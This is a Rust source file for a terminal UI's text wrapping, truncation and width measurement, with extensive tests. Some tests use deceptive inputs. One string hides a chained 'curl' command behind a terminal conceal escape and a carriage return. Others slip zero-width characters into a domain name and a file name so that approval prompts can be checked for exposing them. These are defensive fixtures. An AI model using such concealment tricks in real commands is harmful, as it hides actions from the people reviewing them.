    let mut row_open = false;
    let mut words = line.split_word_bounds().peekable();
    while let Some(word) = words.peek().copied() {
        if at >= end {
            break;
        }
        let word_width = advance(word, row_width, tab).saturating_sub(row_width);
        if row_width.saturating_add(word_width) <= columns {
            // A word of plain ASCII that holds no wanted character moves both
            // measures by its length, so it is stepped over whole: the draw
            // walks the line up to the cursor every frame, and a grapheme at
            // a time that walk cost a 64 KiB line most of a frame.
            let unwanted = plain_width(word).filter(|&chars| {
                wanted
                    .get(wanted.partition_point(|wanted| wanted.end <= at))
                    .is_none_or(|wanted| wanted.start >= at.saturating_add(chars))
            });
            match unwanted {
                Some(chars) => {
                    at += chars;
                    drawn += chars;
                    row_width += word_width;
                }
                None => {
                    for grapheme in word.graphemes(true) {
                        row_width = place(grapheme, &mut at, row, row_width, &mut drawn);
                    }
                }
            }
            row_open = true;
            words.next();
        } else if row_open {
            row += 1;
            row_width = 0;
            drawn = 0;
            row_open = false;
        } else {
            let graphemes: Vec<&str> = word.graphemes(true).collect();
            let mut next = 0usize;
            while next < graphemes.len() {
                let mut cut_width = 0usize;
                let mut cut_drawn = 0usize;
                let mut taken = 0usize;
                while let Some(grapheme) = graphemes.get(next) {
                    let reached = advance(grapheme, cut_width, tab);
                    if taken > 0 && reached > columns {
                        break;
                    }
                    cut_width = place(grapheme, &mut at, row, cut_width, &mut cut_drawn);
                    next += 1;
                    taken += 1;
                    if cut_width > columns {
                        break;
                    }
                }
                row += 1;
            }
            words.next();
        }
    }
    spots
}

/// The characters of `word` where every one is printable ASCII, and so a
/// grapheme of its own one cell wide by the editor's sum and by ratatui's
/// measure alike; `None` for any other word.
fn plain_width(word: &str) -> Option<usize> {
    word.bytes()
        .all(|byte| matches!(byte, b' '..=b'~'))
        .then_some(word.len())
}

/// The rows a word wider than the row is cut into, a grapheme at a time, as
/// the editor cuts it: a grapheme wider than the row still takes a row alone.
fn glyph_rows(word: &str, columns: usize, tab: u8) -> usize {
    let graphemes: Vec<&str> = word.graphemes(true).collect();
    let mut rows = 0usize;
    let mut next = 0usize;
    while next < graphemes.len() {
        rows += 1;
        let mut row_width = 0usize;
        let mut taken = 0usize;
        while let Some(grapheme) = graphemes.get(next) {
            let reached = advance(grapheme, row_width, tab);
            if taken > 0 && reached > columns {
                break;
            }
            row_width = reached;
            next += 1;
            taken += 1;
            if row_width > columns {
                break;
            }
        }
    }
    rows
}

/// The column `text` ends at when it starts at column `from`: a tab runs to
/// the next stop, and every other character takes the cells its own width says.
fn advance(text: &str, from: usize, tab: u8) -> usize {
    use unicode_width::UnicodeWidthChar as _;
    text.chars().fold(from, |column, c| match (c, tab) {
        ('\t', 0) => column,
        ('\t', tab) => {
            let tab = usize::from(tab);
            column + (tab - column % tab)
        }
        (c, _) => column + c.width().unwrap_or(0),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn words_wrap_whole_and_every_character_is_kept() {
        let said = "hands it the code and settings in that directory";
        let rows = wrap_words_exact(said, 20);
        assert_eq!(
            rows,
            ["hands it the code ", "and settings in ", "that directory"]
        );
        assert_eq!(rows.concat(), said);
        assert_eq!(wrap_words_exact_rows(said, 20), rows.len());
    }

    #[test]
    fn a_path_wraps_at_a_directory_rather_than_inside_a_name() {
        let path = "/Users/me/projects/niobe/crates/niobe-cli/src/manifest.rs";
        let rows = wrap_words_exact(path, 40);
        assert_eq!(
            rows,
            [
                "/Users/me/projects/niobe/crates/",
                "niobe-cli/src/manifest.rs"
            ]
        );
        assert_eq!(wrap_words_exact_rows(path, 40), 2);
    }

    /// A row cut short ends in the one space it broke at: a run of spaces
    /// is broken only at the column, so none hides at the end of a row.
    #[test]
    fn a_run_of_spaces_is_never_where_a_row_is_cut_short() {
        let said = "aaaa    bbbb cc";
        let rows = wrap_words_exact(said, 10);
        assert_eq!(rows, ["aaaa    bb", "bb cc"]);
        assert_eq!(rows.concat(), said);
    }

    #[test]
    fn a_word_wider_than_the_row_is_cut_at_the_column() {
        assert_eq!(
            wrap_words_exact("abcdefghij kl", 4),
            ["abcd", "efgh", "ij ", "kl"]
        );
        assert_eq!(wrap_words_exact_rows("abcdefghij kl", 4), 4);
    }

    #[test]
    fn words_wrapped_keep_blank_lines_tabs_and_wide_characters_counted_alike() {
        for (said, columns) in [
            ("one two\n\nthree\tfour five", 6),
            ("日本語 の テキスト を 折り返す", 7),
            ("x/y/z", 2),
            ("", 5),
        ] {
            let rows = wrap_words_exact(said, columns);
            assert_eq!(wrap_words_exact_rows(said, columns), rows.len(), "{said:?}");
            for row in &rows {
                assert!(width(row) <= columns, "{row:?} of {said:?}");
            }
            assert_eq!(
                wrap_words_exact_first(said, columns, 2),
                rows[..rows.len().min(2)]
            );
        }
    }

    #[test]
    fn a_line_past_the_word_bound_is_cut_at_the_column() {
        let long = "ab ".repeat(WORD_BREAK_BYTES);
        assert_eq!(wrap_words_exact(&long, 10), wrap_exact(&long, 10));
        assert_eq!(wrap_words_exact_rows(&long, 10), wrap_exact_rows(&long, 10));
    }

    /// The rows a word-or-glyph editor `columns` wide draws `line` in, read
    /// off the editor itself: its cursor at the end of the text sits on the
    /// last row it drew.
    fn drawn_rows(line: &str, columns: u16) -> usize {
        use ratatui::widgets::Widget as _;
        use ratatui_textarea::{CursorMove, TextArea, WrapMode};
        let mut editor = TextArea::new(vec![line.to_owned()]);
        editor.set_wrap_mode(WrapMode::WordOrGlyph);
        let area = ratatui::layout::Rect::new(0, 0, columns, 200);
        (&editor).render(area, &mut ratatui::buffer::Buffer::empty(area));
        editor.move_cursor(CursorMove::Bottom);
        editor.move_cursor(CursorMove::End);
        editor.screen_cursor().row + 1
    }

    /// Where a word-or-glyph editor `columns` wide draws each character of
    /// `line`, read off what it drew: the cells holding a character's
    /// symbol, row by row, in the order the text runs.
    fn drawn_spots(line: &str, columns: u16) -> Vec<(usize, usize)> {
        use ratatui::widgets::Widget as _;
        use ratatui_textarea::{TextArea, WrapMode};
        let mut editor = TextArea::new(vec![line.to_owned()]);
        editor.set_wrap_mode(WrapMode::WordOrGlyph);
        editor.set_cursor_style(ratatui::style::Style::new());
        let area = ratatui::layout::Rect::new(0, 0, columns, 200);
        let mut buffer = ratatui::buffer::Buffer::empty(area);
        (&editor).render(area, &mut buffer);
        let mut spots = Vec::new();
        let mut cells = (0..area.height).flat_map(|y| (0..area.width).map(move |x| (x, y)));
        for c in line.chars() {
            let symbol = c.to_string();
            let found = cells
                .by_ref()
                .find(|&(x, y)| buffer[(x, y)].symbol() == symbol)
                .expect("every character is drawn");
            spots.push((usize::from(found.1), usize::from(found.0)));
        }
        spots
    }

    #[test]
    fn the_cells_spotted_in_the_composer_are_the_cells_its_editor_draws_in() {
        let lines = [
            "/review it".to_owned(),
            format!("{} /review it", "word ".repeat(13)),
            format!("see {}/review", "x".repeat(30)),
            "short /a /b /c /d /e /f /g /h /i /j /k".to_owned(),
        ];
        for line in &lines {
            for columns in [7u16, 12, 20, 33, 80] {
                let all = 0..line.chars().count();
                let spotted: Vec<(usize, usize)> =
                    editor_spots(line, usize::from(columns), 4, &[all])
                        .into_iter()
                        .map(|(row, column, _)| (row, column))
                        .collect();
                let drawn = drawn_spots(line, columns);
                // Blanks are not looked for on the screen: an empty cell
                // reads as one too.
                let visible: Vec<usize> = line
                    .chars()
                    .enumerate()
                    .filter(|(_, c)| !c.is_whitespace())
                    .map(|(at, _)| at)
                    .collect();
                for at in visible {
                    assert_eq!(
                        spotted[at], drawn[at],
                        "{line:?} at {columns}, character {at}"
                    );
                }
            }
        }
        assert_eq!(
            editor_spots("ab /cd /e", 80, 4, &[3..5, 7..9]),
            [(0, 3, 1), (0, 4, 1), (0, 7, 1), (0, 8, 1)]
        );
    }

    #[test]
    fn a_character_is_spotted_where_it_is_whether_or_not_the_words_before_it_are_wanted_too() {
        let lines = [
            "the quick brown fox jumps over the lazy dog ".repeat(7),
            "word  \t two\tthree\t\tfour ".repeat(5),
            "🦀 crabs and 🎉 parties, ❤️ and 👨‍👩‍👧 ".repeat(6),
            "a漢 /review it 🇺🇦 ok ".repeat(9),
            format!("see {} and /review", "x".repeat(70)),
        ];
        for line in &lines {
            let count = line.chars().count();
            for columns in [1usize, 7, 20, 33, 80] {
                // Every character wanted walks each grapheme on its own, as
                // the line was always walked, so it is what the others match.
                let all = 0..count;
                let every = editor_spots(line, columns, 4, std::slice::from_ref(&all));
                let (last, third) = (count - 1..count, count / 3..count / 3 + 1);
                let spread = [0..1, count / 2..count / 2 + 3, count - 2..count];
                let cases: [&[std::ops::Range<usize>]; 3] = [
                    std::slice::from_ref(&last),
                    &spread,
                    std::slice::from_ref(&third),
                ];
                for wanted in cases {
                    let expected: Vec<(usize, usize, usize)> = wanted
                        .iter()
                        .flat_map(|range| every[range.clone()].iter().copied())
                        .collect();
                    assert_eq!(
                        editor_spots(line, columns, 4, wanted),
                        expected,
                        "{line:?} at {columns} columns, {wanted:?} wanted"
                    );
                }
            }
        }
    }

    #[test]
    fn the_rows_counted_for_the_composer_are_the_rows_its_editor_draws() {
        let lines = [
            String::new(),
            "short".to_owned(),
            "a".repeat(20),
            "a".repeat(21),
            "a".repeat(300),
            "the quick brown fox jumps over the lazy dog ".repeat(7),
            format!("see {} for the rest of it", "https://x.example/".repeat(6)),
            "word  \t two\tthree\t\tfour ".repeat(5),
            "漢字かな交じり文".repeat(9),
            "a漢".repeat(30),
            "🦀 crabs and 🎉 parties, ❤️ and 👨‍👩‍👧 ".repeat(6),
            "     leading and trailing spaces     ".repeat(3),
        ];
        for line in &lines {
            for columns in [1u16, 2, 3, 7, 20, 33, 80] {
                assert_eq!(
                    editor_rows(line, usize::from(columns), 4),
                    drawn_rows(line, columns),
                    "{line:?} at {columns} columns"
                );
            }
        }
    }

    #[test]
    fn a_line_break_on_a_one_line_row_keeps_the_lines_apart() {
        assert_eq!(
            truncate("set -e\ncd /tmp\r\necho done", 80),
            "set -e ↵ cd /tmp ↵ echo done"
        );
        assert_eq!(truncate("a\tb", 80), "a b");
    }

    #[test]
    fn a_wide_string_is_padded_to_the_cells_it_takes_not_its_characters() {
        assert_eq!(pad("漢字", 6), "漢字  ");
        assert_eq!(width(&pad("漢字", 6)), 6);
        assert_eq!(pad("Read", 6), "Read  ");
        assert_eq!(
            pad("漢字漢字", 6),
            "漢字漢字",
            "a string wider than the column is not cut"
        );
    }

    #[test]
    fn an_emoji_with_a_presentation_selector_is_as_wide_as_ratatui_draws_it() {
        use unicode_width::UnicodeWidthStr as _;

        let heart = "\u{2764}\u{fe0f}";
        assert_eq!(width(heart), heart.width());
        assert_eq!(width(heart), 2);
        assert_eq!(width(&heart.repeat(40)), 80);
    }

    #[test]
    fn a_joined_emoji_sequence_is_as_wide_as_ratatui_draws_it() {
        use unicode_width::UnicodeWidthStr as _;

        let family = "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}";
        assert_eq!(width(family), family.width());
    }

    #[test]
    fn an_emoji_is_never_split_or_cut_in_half() {
        let heart = "\u{2764}\u{fe0f}";
        let hearts = heart.repeat(3);

        assert_eq!(
            split_to_width(&hearts, 4),
            [heart.repeat(2), heart.to_owned()]
        );
        assert_eq!(truncate(&hearts, 5), format!("{}…", heart.repeat(2)));
        assert_eq!(truncate_start(&hearts, 5), format!("…{}", heart.repeat(2)));
    }

    #[test]
    fn a_tab_in_a_row_cut_to_one_line_is_a_space() {
        assert_eq!(truncate("a\tb", 10), "a b");
        assert_eq!(truncate("a\tbcdef", 4), "a b…");
        assert_eq!(truncate_words("one\ttwo three", 9), "one two…");
        assert_eq!(truncate_start("dir\tname.rs", 20), "dir name.rs");
    }

    #[test]
    fn a_leading_tab_is_one_level_of_indentation_per_tab() {
        assert_eq!(expand_tabs("\t\treturn"), "        return");
    }

    #[test]
    fn a_tab_mid_line_reaches_the_next_stop_so_columns_still_line_up() {
        assert_eq!(expand_tabs("ID\tstring"), "ID  string");
        assert_eq!(expand_tabs("Body\t[]byte"), "Body    []byte");
        assert_eq!(expand_tabs("名\tx"), "名  x");
    }

    #[test]
    fn a_line_without_tabs_is_unchanged() {
        assert_eq!(expand_tabs("if ok {"), "if ok {");
    }

    #[test]
    fn words_break_on_whitespace() {
        assert_eq!(
            wrap("the quick brown fox jumps", 11),
            ["the quick", "brown fox", "jumps"]
        );
    }

    #[test]
    fn a_word_wider_than_the_line_is_split_rather_than_overflowing() {
        let lines = wrap(
            "see crates/niobe-core/tests/fixtures/claude-session.jsonl",
            12,
        );
        assert!(
            lines.iter().all(|l| width(l) <= 12),
            "a line overflowed: {lines:?}"
        );
        assert!(lines.concat().contains("claude-session.jsonl"));
    }

    #[test]
    fn explicit_newlines_and_blank_lines_survive() {
        assert_eq!(wrap("one\n\ntwo", 20), ["one", "", "two"]);
    }

    #[test]
    fn wide_characters_count_as_two_cells() {
        assert_eq!(width("日本語"), 6);
        assert!(wrap("日本語テスト", 6).iter().all(|l| width(l) <= 6));
    }

    #[test]
    fn a_zero_width_pane_produces_no_lines() {
        assert!(wrap("anything", 0).is_empty());
        assert!(wrap_exact("anything", 0).is_empty());
    }

    #[test]
    fn an_exact_wrap_keeps_every_space_indent_and_blank_line() {
        assert_eq!(
            wrap_exact("if x:\n    print(\"a    b\")\n\n  # done  ", 40),
            ["if x:", "    print(\"a    b\")", "", "  # done  "]
        );
    }

    #[test]
    fn an_exact_wrap_expands_a_tab_to_its_stop() {
        assert_eq!(wrap_exact("\tpass\nID\tx", 40), ["    pass", "ID  x"]);
    }

    #[test]
    fn an_exact_wrap_breaks_only_at_the_column() {
        assert_eq!(wrap_exact("echo a    b  c", 6), ["echo a", "    b ", " c"]);
        assert_eq!(wrap_exact("日本語", 4), ["日本", "語"]);
    }

    #[test]
    fn empty_text_occupies_no_lines_at_all() {
        // A tool call with no body must not push a blank line into the
        // transcript under its head line.
        assert!(wrap("", 40).is_empty());
    }

    #[test]
    fn truncation_marks_what_it_cut() {
        assert_eq!(truncate("catalog/fetch.ts", 20), "catalog/fetch.ts");
        assert_eq!(truncate("catalog/fetch.ts", 8), "catalog…");
        assert_eq!(width(&truncate("catalog/fetch.ts", 8)), 8);
        assert_eq!(truncate("catalog/fetch.ts", 1), "…");
    }

    #[test]
    fn a_phrase_too_long_for_its_room_is_cut_between_words() {
        let caption = "Cost floors and replay pricing";
        assert_eq!(truncate_words(caption, 40), caption);
        assert_eq!(truncate_words(caption, 30), caption);
        assert_eq!(truncate_words(caption, 29), "Cost floors and replay…");
        assert_eq!(truncate_words(caption, 16), "Cost floors and…");
        assert_eq!(truncate_words(caption, 15), "Cost floors…");
        assert_eq!(truncate_words("Cost  floors", 11), "Cost…");
    }

    #[test]
    fn a_first_word_wider_than_the_room_is_cut_inside_it() {
        assert_eq!(truncate_words("interstellar-objects search", 8), "interst…");
        assert_eq!(truncate_words("anything at all", 1), "…");
        assert_eq!(truncate_words("anything at all", 0), "");
    }

    #[test]
    fn a_phrase_of_wide_characters_is_cut_by_cells() {
        let cut = truncate_words("日本語 テスト です", 14);
        assert_eq!(cut, "日本語 テスト…");
        assert_eq!(width(&cut), 14);
        assert_eq!(truncate_words("日本語 テスト です", 13), "日本語…");
    }

    #[test]
    fn a_path_too_long_for_its_row_keeps_its_end() {
        assert_eq!(
            truncate_start("crates/niobe-tui/src/ui.rs", 12),
            "…i/src/ui.rs"
        );
        assert_eq!(truncate_start("ui.rs", 12), "ui.rs");
        assert_eq!(truncate_start("ui.rs", 1), "…");
        assert_eq!(truncate_start("ui.rs", 0), "");
    }

    /// What an approval draws holds no text that draws as nothing, and
    /// changes nothing a script or an emoji needs to draw as it does.
    #[test]
    fn text_that_draws_as_nothing_is_shown_and_what_shapes_a_glyph_is_kept() {
        let shown = |text: &str| controls_shown_in_rows(text).into_owned();
        let selectors: String = "\u{fe00}\u{fe01}\u{fe02}\u{fe03}".repeat(10);

        for hidden in [
            format!("a{selectors}"),
            "a\u{ad}b".to_owned(),
            "a\u{34f}b".to_owned(),
            "a\u{3164}b".to_owned(),
            "a\u{1160}b".to_owned(),
            "a\u{206a}b".to_owned(),
            "a\u{1d173}b".to_owned(),
            format!("a{}", "\u{200c}\u{200d}".repeat(10)),
            format!("a{}", "\u{301}".repeat(300)),
        ] {
            assert!(shown(&hidden).contains('\u{fffd}'), "{hidden:?}");
        }
        for kept in [
            "\u{2764}\u{fe0f}",
            "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}\u{200d}\u{1f466}",
            "e\u{301}",
            "\u{1f3f4}\u{e0067}\u{e0062}\u{e0065}\u{e006e}\u{e0067}\u{e007f}",
            "\u{645}\u{200c}\u{6cc}",
            "1\u{fe0f}\u{20e3}",
            "\u{1f3f3}\u{fe0f}\u{200d}\u{1f308}",
            "\u{915}\u{94d}\u{200d}\u{937}",
            "\u{1f3f4}\u{e0067}\u{e0062}\u{e0077}\u{e006c}\u{e0073}\u{e007f}",
        ] {
            assert_eq!(shown(kept), kept, "{kept:?}");
        }
        for hidden in [
            "api.anthro\u{200d}pic.com",
            "ma\u{fe0f}in.rs",
            "\u{4e2d}\u{200d}\u{200c}\u{6587}",
            "\u{1f3f4}\u{e0063}\u{e0075}\u{e0072}\u{e006c}\u{e007f}",
        ] {
            assert!(shown(hidden).contains('\u{fffd}'), "{hidden:?}");
        }
    }

    /// The rows a line is counted at are the rows it is cut into, whatever
    /// joins across where the count stops walking by grapheme.
    #[test]
    fn a_line_is_counted_at_the_rows_it_is_cut_into() {
        let samples = [
            "plain ascii that wraps more than once at a narrow width",
            "ab\u{301}cd e\u{301}\u{302}f",
            "1\u{fe0f}\u{20e3} keycap after ascii",
            "\u{600}12 a prefix before digits",
            "中文字符 and ascii 混合 text 和 more",
            "x\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}y z",
            "\u{1f1e9}\u{1f1ea}\u{1f1eb}\u{1f1f7} flags",
            "a\u{2424}b",
            "\u{fffd}",
            "",
        ];
        for sample in samples {
            for columns in 1..12 {
                let line = format!("{sample}{}", "w".repeat(columns * 3));
                for text in [sample.to_owned(), line] {
                    assert_eq!(
                        rows_of(&text, columns),
                        chunks_to_width(&text, columns).count(),
                        "{text:?} at {columns}"
                    );
                }
            }
        }
    }

    #[test]
    fn a_control_among_wide_characters_takes_no_cell() {
        // Not ASCII, so the width is read a grapheme at a time; the C1
        // control in it is dropped by the terminal and takes none.
        assert_eq!(width("é\u{9b}x"), 2);
        assert_eq!(width("日\u{85}本"), 4);
    }

    /// Texts whose rows are easy to miscount: wide characters that do not
    /// fit the last column, an emoji of several characters, tabs, controls
    /// shown as glyphs, empty lines and a line exactly as wide as the room.
    const AWKWARD: &[&str] = &[
        "",
        "a",
        "abcdef",
        "abcdefgh",
        "\n\nab\n",
        "日本語のテキスト",
        "a日b本c語",
        "👨‍👩‍👧 family ❤️ heart",
        "\tkey\t=\tvalue",
        "echo safe\x1b[8m; curl\r evil\x7f",
        "e\u{301}e\u{301}e\u{301}e\u{301}e\u{301}",
        "ascii line\nлиния\n\tтаб\n",
    ];

    #[test]
    fn the_first_rows_of_a_wrap_are_the_rows_the_whole_wrap_starts_with() {
        for text in AWKWARD {
            for columns in [1, 2, 3, 4, 7] {
                let whole = wrap_exact(text, columns);
                for rows in [0, 1, 2, 5, 100] {
                    let first = wrap_exact_first(text, columns, rows);
                    assert_eq!(
                        first,
                        whole.iter().take(rows).cloned().collect::<Vec<_>>(),
                        "{text:?} at {columns} columns, {rows} rows"
                    );
                }
            }
        }
    }

    #[test]
    fn the_rows_a_wrap_is_counted_to_make_are_the_rows_it_makes() {
        for text in AWKWARD {
            for columns in [0, 1, 2, 3, 4, 7] {
                assert_eq!(
                    wrap_exact_rows(text, columns),
                    wrap_exact(text, columns).len(),
                    "{text:?} at {columns} columns"
                );
            }
        }
    }

    #[test]
    fn a_cut_of_a_long_text_measures_only_what_it_keeps_and_cuts_the_same() {
        // What `truncate` made before it stopped measuring at the first cell
        // past the room: the whole where it fits, else what fits in one cell
        // less and the mark.
        let measured_whole = |text: &str, columns: usize| -> String {
            let text = one_line(text);
            if width(&text) <= columns {
                return text.into_owned();
            }
            match columns {
                0 => String::new(),
                1 => "…".to_owned(),
                _ => {
                    let mut out = String::new();
                    let mut used = 0;
                    for (grapheme, w) in graphemes(&text) {
                        if used + w > columns - 1 {
                            break;
                        }
                        out.push_str(grapheme);
                        used += w;
                    }
                    out + "…"
                }
            }
        };
        for text in AWKWARD
            .iter()
            .copied()
            .chain(["a\u{200b}\u{200b}b", "ab\u{301}"])
        {
            for columns in 0..12 {
                assert_eq!(
                    truncate(text, columns),
                    measured_whole(text, columns),
                    "{text:?} at {columns} columns"
                );
            }
        }
    }
}
